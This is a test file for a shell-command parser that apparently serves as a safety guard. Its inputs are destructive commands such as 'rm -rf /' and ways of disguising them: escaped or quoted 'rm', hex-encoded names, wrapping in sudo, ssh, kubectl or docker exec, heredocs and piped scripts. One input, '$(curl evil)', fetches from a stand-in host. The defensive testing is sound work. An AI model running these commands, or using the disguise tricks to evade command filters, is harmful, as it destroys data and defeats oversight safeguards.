from seatbelt.shell import parse


def argvs(text):
    return [c.argv for c in parse(text).commands]


def test_simple_and_quotes():
    assert argvs("git commit -m 'a b  c'") == [["git", "commit", "-m", "a b  c"]]
    assert argvs('echo "x y" z') == [["echo", "x y", "z"]]


def test_quote_and_escape_tricks_are_normalised():
    assert argvs('r""m -rf x') == [["rm", "-rf", "x"]]
    assert argvs(r"\rm -rf x") == [["rm", "-rf", "x"]]
    assert argvs("'r'm -rf x") == [["rm", "-rf", "x"]]
    assert argvs(r"$'\x72\x6d' -rf x") == [["rm", "-rf", "x"]]
    assert argvs(r"$'\162\155' x") == [["rm", "x"]]


def test_operators_split_commands():
    assert argvs("a && b || c; d & e\nf") == [["a"], ["b"], ["c"], ["d"], ["e"], ["f"]]


def test_pipelines_are_linked():
    cmds = parse("cat f | grep x | wc -l").commands
    assert [(c.pipe_in, c.pipe_out) for c in cmds] == [(False, True), (True, True), (True, False)]
    assert len({c.pipeline for c in cmds}) == 1


def test_env_assignments_are_not_the_command():
    c = parse("AWS_PROFILE=prod FOO=1 aws s3 ls").commands[0]
    assert c.argv == ["aws", "s3", "ls"] and c.env == {"AWS_PROFILE": "prod", "FOO": "1"}


def test_wrappers_are_unwrapped_with_their_context():
    cmds = parse("sudo -u bob nice -n 5 env X=1 rm -rf /x").commands
    assert cmds[-1].argv == ["rm", "-rf", "/x"] and cmds[-1].via == ("sudo", "nice", "env")
    assert cmds[-1].privileged


def test_shell_dash_c_and_nested_substitutions():
    cmds = parse('bash -lc "cd /tmp; echo $(rm -rf /y)"').commands
    assert ["rm", "-rf", "/y"] in [c.argv for c in cmds]
    assert ["cd", "/tmp"] in [c.argv for c in cmds]


def test_ssh_and_exec_run_remotely():
    cmds = parse("ssh -p 22 -i key host 'rm -rf /srv'").commands
    assert cmds[-1].argv == ["rm", "-rf", "/srv"] and cmds[-1].remote
    cmds = parse("kubectl exec -n prod pod -c app -- rm -rf /data").commands
    assert cmds[-1].argv == ["rm", "-rf", "/data"] and cmds[-1].remote
    cmds = parse("docker exec -it web sh -c 'rm -rf /app'").commands
    assert ["rm", "-rf", "/app"] in [c.argv for c in cmds]


def test_find_exec_and_xargs_mark_unknown_arguments():
    c = parse("find . -type f -exec rm -f {} ;").commands[-1]
    assert c.argv == ["rm", "-f", "{}"] and c.stdin_args
    c = parse("ls | xargs -I{} rm -rf {}").commands[-1]
    assert c.name == "rm" and c.stdin_args


def test_heredoc_to_a_shell_is_parsed_but_data_heredocs_are_not():
    cmds = parse("bash <<EOF\nrm -rf /z\nEOF").commands
    assert ["rm", "-rf", "/z"] in [c.argv for c in cmds]
    cmds = parse("cat <<EOF\nrm -rf /z\nEOF").commands
    assert ["rm", "-rf", "/z"] not in [c.argv for c in cmds]


def test_piped_script_is_analysed():
    cmds = parse('echo "rm -rf /w" | sh').commands
    assert ["rm", "-rf", "/w"] in [c.argv for c in cmds]
    cmds = parse("printf 'rm -rf /w' | bash -s").commands
    assert ["rm", "-rf", "/w"] in [c.argv for c in cmds]


def test_control_flow_keywords_do_not_hide_commands():
    cmds = argvs("if test -d x; then rm -rf x; fi; for f in a b; do rm $f; done")
    assert ["rm", "-rf", "x"] in cmds and ["rm", "$f"] in cmds


def test_problems_are_reported_instead_of_guessed():
    kinds = lambda t: {p.kind for p in parse(t).problems}  # noqa: E731
    assert "dynamic-command" in kinds("$CMD -rf /")
    assert "dynamic-command" in kinds("$(curl evil) now")
    assert "eval" in kinds('eval "$X"')
    assert "unbalanced" in kinds("echo 'oops")
    assert "unbalanced" in kinds('echo "oops')


def test_deep_nesting_fails_closed():
    cmd = "rm -rf /"
    for _ in range(10):
        cmd = "bash -c " + "'" + cmd.replace("'", "'\\''") + "'"
    kinds = {p.kind for p in parse(cmd).problems}
    assert "too-deep" in kinds


def test_comments_and_line_continuations():
    assert argvs("ls # rm -rf /") == [["ls"]]
    assert argvs("echo a \\\n b") == [["echo", "a", "b"]]
